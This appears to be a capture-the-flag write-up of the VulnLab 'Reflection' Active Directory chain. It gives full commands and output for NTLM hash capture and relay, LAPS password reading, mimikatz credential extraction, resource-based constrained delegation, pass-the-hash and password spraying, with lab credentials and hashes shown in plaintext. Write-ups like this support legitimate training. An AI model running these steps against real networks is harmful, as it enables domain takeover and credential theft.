## Recon
Reflection is a chain of machines on the VulnLab platform marked as medium difficulty. Once i spawn the chain, i get 3 IP's:
- 10.10.194.213
- 10.10.194.214
- 10.10.194.215

Let's run an nmap scan on each of these hosts:
#### 10.10.194.213
```
Nmap scan report for 10.10.194.213
Host is up (0.030s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-08-30 07:34:02Z
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: reflection.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?                                                                                                                                                       
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped                                                              
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM                                                                                                      
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)                         
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback                                               
| Not valid before: 2023-08-30T07:08:46                                                 
|_Not valid after:  2053-08-30T07:08:46                                                 
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)      
|_ssl-date: 2023-08-30T07:35:33+00:00; -1s from scanner time.                                                                                                                   
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: reflection.vl0., Site: Default-First-Site-Name)                                                            3269/tcp  open  tcpwrapped             
3389/tcp  open  ms-wbt-server Microsoft Terminal Services                                                                                                                       
|_ssl-date: 2023-08-30T07:35:33+00:00; -1s from scanner time.                                                                                                                   
| ssl-cert: Subject: commonName=dc01.reflection.vl           
| Not valid before: 2023-06-06T16:19:23                                                                                                                                         
|_Not valid after:  2023-12-06T16:19:23
| rdp-ntlm-info:                                                                        
|   Target_Name: REFLECTION                                                             
|   NetBIOS_Domain_Name: REFLECTION                                                     
|   NetBIOS_Computer_Name: DC01        
|   DNS_Domain_Name: reflection.vl     
|   DNS_Computer_Name: dc01.reflection.vl
|   DNS_Tree_Name: reflection.vl
|   Product_Version: 10.0.20348    
|_  System_Time: 2023-08-30T07:34:53+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                  
|_http-title: Not Found                  
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC                                                    
49668/tcp open  msrpc         Microsoft Windows RPC                                                    
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0    
49670/tcp open  msrpc         Microsoft Windows RPC                                                    
49671/tcp open  msrpc         Microsoft Windows RPC                                                    
49684/tcp open  msrpc         Microsoft Windows RPC
56624/tcp open  msrpc         Microsoft Windows RPC
56627/tcp open  msrpc         Microsoft Windows RPC              
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```
Judging by the open ports this looks like a standard Domain Controller, which is confirmed by NetBIOS computer name from the RDP service scan, DC01. What is unusual is the MSSQL port being open.

#### 10.10.194.214

```
Nmap scan report for 10.10.194.214
Host is up (0.031s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC 
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2023-08-30T07:54:14+00:00; -1s from scanner time.                                 
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback                                                                                                                                                                 
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-08-30T07:06:04
| Not valid after:  2053-08-30T07:06:04
| MD5:   8a1e:4167:07f1:ea22:b8de:57a1:d337:4222
|_SHA-1: e02d:4f17:b044:f47b:f1bd:8d7d:4406:ba56:cbc3:baaa
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=ms01.reflection.vl
| Issuer: commonName=ms01.reflection.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-06-06T16:41:09
| Not valid after:  2023-12-06T16:41:09
| MD5:   96a9:5932:6b08:93c9:1d95:5592:35f8:740e
|_SHA-1: d931:5658:eace:f10c:1b28:00ab:c293:4cdc:397a:a68b
| rdp-ntlm-info: 
|   Target_Name: REFLECTION
|   NetBIOS_Domain_Name: REFLECTION
|   NetBIOS_Computer_Name: MS01
|   DNS_Domain_Name: reflection.vl
|   DNS_Computer_Name: ms01.reflection.vl
|   DNS_Tree_Name: reflection.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2023-08-30T07:53:34+00:00
|_ssl-date: 2023-08-30T07:54:14+00:00; -1s from scanner time.
49668/tcp open  msrpc         Microsoft Windows RPC 
49669/tcp open  msrpc         Microsoft Windows RPC 
49670/tcp open  msrpc         Microsoft Windows RPC 
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
The hostname of this computer is MS01 and it again has MSSQL port open, as well as RDP and SMB.

#### 10.10.194.215

```
Nmap scan report for 10.10.194.215
Host is up (0.030s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-08-30T08:04:24+00:00; -3s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: REFLECTION
|   NetBIOS_Domain_Name: REFLECTION
|   NetBIOS_Computer_Name: WS01
|   DNS_Domain_Name: reflection.vl
|   DNS_Computer_Name: ws01.reflection.vl
|   DNS_Tree_Name: reflection.vl
|   Product_Version: 10.0.19041
|_  System_Time: 2023-08-30T08:03:44+00:00
| ssl-cert: Subject: commonName=ws01.reflection.vl
| Not valid before: 2023-06-06T16:42:13
|_Not valid after:  2023-12-06T16:42:13
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
This host is WS01 and has only the RDP and SMB ports open.

## SMB

I usually like to start of by trying anonymous access to SMB shares, and since all 3 hosts have SMB running it makes sense in this case. Using `crackmapexec` i can try empty username and password first:
```bash
crackmapexec smb 10.10.194.213-215 -u '' -p '' --shares                         
SMB         10.10.194.213   445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)
SMB         10.10.194.215   445    WS01             [*] Windows 10.0 Build 19041 x64 (name:WS01) (domain:reflection.vl) (signing:False) (SMBv1:False)                          
SMB         10.10.194.214   445    MS01             [*] Windows 10.0 Build 20348 x64 (name:MS01) (domain:reflection.vl) (signing:False) (SMBv1:False)
SMB         10.10.194.213   445    DC01             [+] reflection.vl\: 
SMB         10.10.194.213   445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
SMB         10.10.194.215   445    WS01             [-] reflection.vl\: STATUS_ACCESS_DENIED 
SMB         10.10.194.215   445    WS01             [-] Error enumerating shares: Error occurs while reading from remote(104)
SMB         10.10.194.214   445    MS01             [+] reflection.vl\: 
SMB         10.10.194.214   445    MS01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
Running CME against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```
This doesn't seem to work, but if i provide a non-empty username, i can list the shares on the MS01 host:
```bash
crackmapexec smb 10.10.194.213-215 -u 'hanzbzz' -p '' --shares
SMB         10.10.194.214   445    MS01             [*] Windows 10.0 Build 20348 x64 (name:MS01) (domain:reflection.vl) (signing:False) (SMBv1:False)
SMB         10.10.194.215   445    WS01             [*] Windows 10.0 Build 19041 x64 (name:WS01) (domain:reflection.vl) (signing:False) (SMBv1:False)
SMB         10.10.194.213   445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)
SMB         10.10.194.214   445    MS01             [+] reflection.vl\hanzbzz: 
SMB         10.10.194.215   445    WS01             [-] reflection.vl\hanzbzz: STATUS_NO_LOGON_SERVERS 
SMB         10.10.194.213   445    DC01             [-] reflection.vl\hanzbzz: STATUS_LOGON_FAILURE 
SMB         10.10.194.214   445    MS01             [*] Enumerated shares
SMB         10.10.194.214   445    MS01             Share           Permissions     Remark
SMB         10.10.194.214   445    MS01             -----           -----------     ------
SMB         10.10.194.214   445    MS01             ADMIN$                          Remote Admin
SMB         10.10.194.214   445    MS01             C$                              Default share
SMB         10.10.194.214   445    MS01             IPC$            READ            Remote IPC
SMB         10.10.194.214   445    MS01             staging         READ            staging environment
```
It is also worth noting that the WS01 host returns `STATUS_NO_LOGON_SERVERS` instead of the usual `STATUS_LOGON_FAILURE`.  Anyway, let's inspect the `staging` share, which i have read access to.
```bash
smbclient -U hanzbzz //10.10.194.214/staging
Password for [WORKGROUP\hanzbzz]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jun  7 19:42:48 2023
  ..                                  D        0  Wed Jun  7 19:41:25 2023
  staging_db.conf                     A       50  Thu Jun  8 13:21:49 2023

                6261245 blocks of size 4096. 1759918 blocks available
smb: \> get staging_db.conf 
getting file \staging_db.conf of size 50 as staging_db.conf (0,4 KiloBytes/sec) (average 0,4 KiloBytes/sec)
smb: \> exit
```
Using smbclient with random username and empty password logs me in, and there is one file, `staging_db.conf`. 
```bash
cat staging_db.conf
user=web_staging
password=Washroom510
db=staging
```
## MSSQL
Looking at the name and contents of the file, this looks like database credentials. Let's again use `crackmapexec` and attempt to login to the two MSSQL servers running:
```bash
crackmapexec mssql 10.10.194.213-214 -u 'web_staging' -p 'Washroom510'                                                                                                       
MSSQL       10.10.194.214   1433   MS01             [*] Windows 10.0 Build 20348 (name:MS01) (domain:reflection.vl)                                                             
MSSQL       10.10.194.213   1433   DC01             [*] Windows 10.0 Build 20348 (name:DC01) (domain:reflection.vl)                                                             
MSSQL       10.10.194.214   1433   MS01             [-] ERROR(MS01\SQLEXPRESS): Line 1: Login failed for user 'MS01\Guest'.                                                     
MSSQL       10.10.194.213   1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated a
uthentication.
```
I get two different errors. Looking at the result for MS01, the login failed for user `MS01\Guest`. This seems to imply that this computer is using local instead of domain authentication, so i try using `CME` again with `--local-auth` flag:
```bash
crackmapexec mssql 10.10.194.213-214 -u 'web_staging' -p 'Washroom510' --local-auth 
MSSQL       10.10.194.214   1433   MS01             [*] Windows 10.0 Build 20348 (name:MS01) (domain:MS01)
MSSQL       10.10.194.213   1433   DC01             [*] Windows 10.0 Build 20348 (name:DC01) (domain:DC01)
MSSQL       10.10.194.214   1433   MS01             [+] web_staging:Washroom510 
MSSQL       10.10.194.213   1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed for user 'web_staging'.
```
These credentials indeed work, and i can login to the MSSQL server on MS01:
```
mssqlclient.py web_staging:Washroom510@10.10.194.214
Impacket v0.11.0 - Copyright 2023 Fortra
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MS01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(MS01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (web_staging  guest@master)>
```
Browsing through the database, there doesn't seem to be much of interest. There is a users table in the staging db:
```
SQL (web_staging  dbo@staging)> select * from users;
id   username   password        
--   --------   -------------   
 1   b'dev01'   b'Initial123'   
 2   b'dev02'   b'Initial123'
```
However these credentials don't work over SMB/RDP/MSSQL. I should however note the password `Initial123` and attempt password spraying with it, if i get a list of users in the future
Next thing i can try is executing system commands with `xp_cmdshell`, however it is disabled and my user doesn't have enough privileges to enable it:
```
SQL (web_staging  dbo@staging)> xp_cmdshell whoami;
[-] ERROR(MS01\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
SQL (web_staging  dbo@staging)> EXEC sp_configure 'show advanced options',1;
[-] ERROR(MS01\SQLEXPRESS): Line 105: User does not have permission to perform this action
```
Another potential attack is stealing the NTLMv2 hash using the `xp_dirtree` command. I need to start the `Responder` tool on my attack machine and list the files on the SMB server:

![img](/assets/screenshots/vulnlab-reflection/ntlm.gif)

## NTLM relay

I tried cracking the acquired NTLMv2 hash with hashcat and the `rockyou.txt` wordlist, but unsuccessfully. 
Another attack vector that i can try with the obtained NTLMv2 hash is NTLM relaying. The attack is well described on [this](https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/) blogpost. For this attack, SMB signing needs to be disabled on the target machine. Looking at the SMB scans from earlier, all 3 machines have SMB signing disabled, so that's good.  Next steps to prepare this attack are to create the targets.txt file containing the targets where SMB signing is disabled, and disabling the SMB and HTTP server of Responder:
```bash
cat targets.txt                                                                      
10.10.194.213
10.10.194.214
10.10.194.215
cat /opt/responder/Responder.conf
[Responder Core]                                                                         
; Servers to start                                                                       
SQL = On                                                                                 
SMB = Off # Turn this off                                                             
RDP = On                                                                                
Kerberos = On                                                                           
FTP = On                                                                             
POP = On                                                                                   
SMTP = On                                                                                 
IMAP = On                                                                               
HTTP = Off # turn this off                                                                
HTTPS = On                                                                              
DNS = On
<SNIP>
```
The attack chain is showcased in the gif below:

![img](/assets/screenshots/vulnlab-reflection/ntlm_relay.gif)

Few things to note about this attack:
- The `ntlmrelayx.py`  needs to be run with SMB2 support (`--smb2support` flag) and with the `--socks` flag. By default `ntlmrelayx.py` tries to dump the SAM database, but the compromised user has not enough privileges to do that, so instead i just tell it to start SOCKS proxy with the `--socks` option
- It is important to use the exact username that got intercepted by `ntlmrelayx.py`, in this case `REFLECTION\SVC_WEB_STAGING` (notice the shortened domain).  `Crackmapexec` requires FQDN to work, and therefore it fails in this case.

I was able to download the `prod_db.conf` file, which contains another set of credentials:
```bash
cat prod_db.conf                                                           
user=web_prod
password=Tribesman201
db=prod
```
These credentials work on the MSSQL server running on DC01:
```bash
crackmapexec mssql 10.10.194.213-214 -u 'web_prod' -p 'Tribesman201' --local-auth
MSSQL       10.10.194.213   1433   DC01             [*] Windows 10.0 Build 20348 (name:DC01) (domain:DC01)
MSSQL       10.10.194.214   1433   MS01             [*] Windows 10.0 Build 20348 (name:MS01) (domain:MS01)
MSSQL       10.10.194.213   1433   DC01             [+] web_prod:Tribesman201 
MSSQL       10.10.194.214   1433   MS01             [-] ERROR(MS01\SQLEXPRESS): Line 1: Login failed for user 'web_prod'.
Running CME against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```
I can then login to the MSSQL database, and get two user credentials from the `prod` db:
```
SQL (web_prod  dbo@prod)> use prod;
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: prod
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'prod'.
SQL (web_prod  dbo@prod)> SELECT  DISTINCT  table_name FROM information_schema.columns
table_name   
----------   
users        

SQL (web_prod  dbo@prod)> select * from users;
id   name              password            
--   ---------------   -----------------   
 1   b'abbie.smith'    b'CMe1x+nlRaaWEw'   

 2   b'dorothy.rose'   b'hC_fny3OK9glSJ'   

SQL (web_prod  dbo@prod)>
```
Both of these credentials appear to be valid domain users:
```
crackmapexec smb 10.10.194.213 -u 'abbie.smith' -p 'CMe1x+nlRaaWEw'                                                                                                          
SMB         10.10.194.213   445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)                           
SMB         10.10.194.213   445    DC01             [+] reflection.vl\abbie.smith:CMe1x+nlRaaWEw                                                                                
crackmapexec smb 10.10.194.213 -u 'dorothy.rose' -p 'hC_fny3OK9glSJ'                                                                                                         
SMB         10.10.194.213   445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)                           
SMB         10.10.194.213   445    DC01             [+] reflection.vl\dorothy.rose:hC_fny3OK9glSJ 
```
## MS01

Using the acquired domain credentials and `bloodhound-python`, i can dump information about the domain and import it to bloodhound. Interestingly, `abbie.smith` has `GenericAll` privileges over the MS01 host:

![bloodhound](/assets/screenshots/vulnlab-reflection/bloodhound.png)

According to bloodhound there are 2 ways to abuse this privilege:
- [Resource-based constrained delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution) - this failed because none of the users that i control can add computer to the domain (both had Machine Account Quota set to 0)
- [Shadow credentials](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials) - this failed because of LDAPS, i couldn't get past the SSL errors

I spent quite some time trying to get these attacks to work, but kept running into issues. Since the attack was failing because of LDAP, i tried `CME` to login with via LDAP, and it turns out `abbie.smith` can read the LAPS of MS01:
```
crackmapexec ldap 10.10.230.149 -u abbie.smith -p CMe1x+nlRaaWEw -M LAPS                 
SMB         10.10.230.149   445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)
LDAP        10.10.230.149   389    DC01             [+] reflection.vl\abbie.smith:CMe1x+nlRaaWEw 
LAPS        10.10.230.149   389    DC01             [*] Getting LAPS Passwords
LAPS        10.10.230.149   389    DC01             Computer:MS01$ User:                Password:H447.++h6g5}xi
```
This is indeed, the password of local admin on MS01:
```
crackmapexec rdp 10.10.230.150 -u administrator -p 'H447.++h6g5}xi' --local-auth         
RDP         10.10.230.150   3389   MS01             [*] Windows 10 or Windows Server 2016 Build 20348 (name:MS01) (domain:MS01) (nla:False)
RDP         10.10.230.150   3389   MS01             [+] MS01\administrator:H447.++h6g5}xi (Pwn3d!)
```
I can login via RDP and get the on admin's desktop:

![rdp](/assets/screenshots/vulnlab-reflection/rdp.png)

Now its time to dump the stored credentials with mimikatz. The `sekurlsa::logonpasswords` module fails:
```
PS C:\Users\Administrator\Documents> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list
```
However, the `vault::cred` module, which enumerates password stored for scheduled tasks, seems to return someting:
```
mimikatz # vault::cred

mimikatz # vault::list

Vault : {4bf4c442-9b8a-41a0-b380-dd4a704ddb28}
        Name       : Web Credentials
        Path       : C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
        Items (0)

Vault : {77bc582b-f0a6-4e15-4e80-61736b6f3b29}
        Name       : Windows Credentials
        Path       : C:\Users\Administrator\AppData\Local\Microsoft\Vault
        Items (0)
```
Before i can read the passwords, i need to elevate my access token:
```
mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

552     {0;000003e7} 1 D 27284          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;0073ced0} 2 D 11237419    MS01\Administrator      S-1-5-21-1123338414-2776126748-2899213862-500   (14g,24p)    Primary
 * Thread Token  : {0;000003e7} 1 D 11300164    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
```
Now i can see that this password is a domain password for user `georgia.price` :
```
mimikatz # vault::cred
TargetName : Domain:batch=TaskScheduler:Task:{013CD3ED-72CB-4801-99D7-8E7CA1F7E370} / <NULL>
UserName   : REFLECTION\Georgia.Price
Comment    : <NULL>
Type       : 2 - domain_password
Persist    : 2 - local_machine
Flags      : 00004004
Credential :
Attributes : 0
```
To get the cleartext value of password, i need to add the `/patch` flag:
```
mimikatz # vault::cred /patch
TargetName : Domain:batch=TaskScheduler:Task:{013CD3ED-72CB-4801-99D7-8E7CA1F7E370} / <NULL>
UserName   : REFLECTION\Georgia.Price
Comment    : <NULL>
Type       : 2 - domain_password
Persist    : 2 - local_machine
Flags      : 00004004
Credential : DBl+5MPkpJg5id
Attributes : 0
```
## WS01

Again looking at the BloodHound output, `georgia.price` has `GenericAll` rights over WS01:

![img](/assets/screenshots/vulnlab-reflection/bloodhound2.png)

This time, i already have access to computer account (MS01) so i can abuse RBCD. There is a great [article](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd#practice) on the necessary steps. Only thing i am missing is the password to MS01, but i can get the NT hash instead with `secretsdump.py`, as i have admin access to MS01:
```
secretsdump.py administrator:'H447.++h6g5}xi'@10.10.230.150
Impacket v0.11.0 - Copyright 2023 Fortra
<SNIP>
REFLECTION\MS01$:aad3b435b51404eeaad3b435b51404ee:d4af14c2b96f72e1a935ac16fe6a8227:::
<SNIP>
```
First, allow MS01 to impersonate users on WS01:
```
rbcd.py -delegate-from 'MS01$' -delegate-to 'WS01$' -action 'write' 'reflection.vl/georgia.price:DBl+5MPkpJg5id' -dc-ip 10.10.230.149
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] MS01$ can now impersonate users on WS01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     MS01$        (S-1-5-21-3375389138-1770791787-1490854311-1104)
```
Second, get the ticket impersonating administrator user:
```
getST.py -spn 'cifs/ws01.reflection.vl' -impersonate 'administrator' 'reflection.vl/MS01$' -hashes :d4af14c2b96f72e1a935ac16fe6a8227 -dc-ip 10.10.230.149
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Getting TGT for user
[*] Impersonating administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in administrator.ccache
```
Lastly, export the ticket and use `secretsdump.py` to dump the hashes. This is possible since the ticket grants me access as an administrator to the filesystem. Note that i need to use the hostname(won't work with IP) and it needs to match the one on ticket. For this to work, i needed to add an entry to `/etc/hosts` for `ws01.reflection.vl`.
```
export KRB5CCNAME=administrator.ccache
secretsdump.py -k ws01.reflection.vl                    
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x7ed33ac4a19a5ea7635d402e58c0055f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a29542cb2707bf6d6c1d2c9311b0ff02:::
<SNIP>
```
There is an RDP open on WS01, but i can't login with pass the hash. However, i can use `smbexec.py` to login with the hash, and change the administrator password:
```
smbexec.py administrator@10.10.230.151 -hashes :a29542cb2707bf6d6c1d2c9311b0ff02
Impacket v0.11.0 - Copyright 2023 Fortra

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>net user administrator Password123
The command completed successfully.
```

![ws01](/assets/screenshots/vulnlab-reflection/ws01.png)

The flag is located on the Desktop of `rhys.garner` user.
## DC01

In the `secretsdump.py` output, there was also the password for `rhys.garner`
```
secretsdump.py -k ws01.reflection.vl                                                                                                                                         
Impacket v0.11.0 - Copyright 2023 Fortra                                                                                                                                        
<SNIP>                                                                                                                                                     
reflection.vl\Rhys.Garner:knh1gJ8Xmeq+uP
```
I can try to password-spray all domain users with this password:
```
crackmapexec smb 10.10.230.149 -u users.txt -p knh1gJ8Xmeq+uP --continue-on-success
SMB         10.10.230.149   445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)
SMB         10.10.230.149   445    DC01             [-] reflection.vl\labadm:knh1gJ8Xmeq+uP STATUS_LOGON_FAILURE 
SMB         10.10.230.149   445    DC01             [-] reflection.vl\Georgia.Price:knh1gJ8Xmeq+uP STATUS_LOGON_FAILURE 
SMB         10.10.230.149   445    DC01             [-] reflection.vl\Michael.Wilkinson:knh1gJ8Xmeq+uP STATUS_LOGON_FAILURE 
SMB         10.10.230.149   445    DC01             [-] reflection.vl\Bethany.Wright:knh1gJ8Xmeq+uP STATUS_LOGON_FAILURE 
SMB         10.10.230.149   445    DC01             [-] reflection.vl\Craig.Williams:knh1gJ8Xmeq+uP STATUS_LOGON_FAILURE 
SMB         10.10.230.149   445    DC01             [-] reflection.vl\Abbie.Smith:knh1gJ8Xmeq+uP STATUS_LOGON_FAILURE 
SMB         10.10.230.149   445    DC01             [-] reflection.vl\Dorothy.Rose:knh1gJ8Xmeq+uP STATUS_LOGON_FAILURE 
SMB         10.10.230.149   445    DC01             [-] reflection.vl\Dylan.Marsh:knh1gJ8Xmeq+uP STATUS_LOGON_FAILURE 
SMB         10.10.230.149   445    DC01             [+] reflection.vl\Rhys.Garner:knh1gJ8Xmeq+uP 
SMB         10.10.230.149   445    DC01             [-] reflection.vl\Jeremy.Marshall:knh1gJ8Xmeq+uP STATUS_LOGON_FAILURE 
SMB         10.10.230.149   445    DC01             [-] reflection.vl\Deborah.Collins:knh1gJ8Xmeq+uP STATUS_LOGON_FAILURE 
SMB         10.10.230.149   445    DC01             [-] reflection.vl\svc_web_prod:knh1gJ8Xmeq+uP STATUS_LOGON_FAILURE 
SMB         10.10.230.149   445    DC01             [-] reflection.vl\svc_web_staging:knh1gJ8Xmeq+uP STATUS_LOGON_FAILURE 
SMB         10.10.230.149   445    DC01             [+] reflection.vl\dom_rgarner:knh1gJ8Xmeq+uP (Pwn3d!)
```
This user is part of the `Domain admins` group. I can simply login with RDP and read the flag from the Administrator's desktop

![da](/assets/screenshots/vulnlab-reflection/da.png)